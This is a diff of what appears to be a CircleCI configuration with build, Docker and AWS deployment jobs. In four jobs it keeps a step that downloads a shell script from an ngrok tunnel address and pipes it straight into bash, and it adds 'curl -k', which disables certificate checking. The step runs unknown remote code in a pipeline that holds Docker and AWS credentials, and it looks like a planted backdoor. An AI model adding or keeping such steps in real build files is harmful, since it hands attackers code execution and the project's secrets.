@@ -27,7 +27,7 @@ jobs:
 
     steps:
       - checkout
-      - run: curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash      
+      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash      
       - run: mkdir -p /tmp/artifacts
       - run:
           name: Install System Dependencies
@@ -51,7 +51,7 @@ jobs:
 
     steps:
       - checkout
-      - run: curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
+      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
       - run:
           name: Install System Dependencies
           command: sudo apt-get update -qq && sudo apt-get install -yy libxml2-dev libxmlsec1-dev liblzma-dev pkg-config xmlsec1 postgresql-client
@@ -79,7 +79,7 @@ jobs:
     steps:
       - checkout
       - setup_remote_docker
-      - run: curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
+      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
       - run: docker login -u $DOCKER_USER -p $DOCKER_PASS
       - run: docker-build
 
@@ -94,5 +94,5 @@ jobs:
       - run:
           name: Install AWS cli
           command: sudo pip install awscli
-      - run: curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
+      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
       - run: aws s3 cp docs/cloudformation.json s3://empirepaas/cloudformation.json --acl public-read
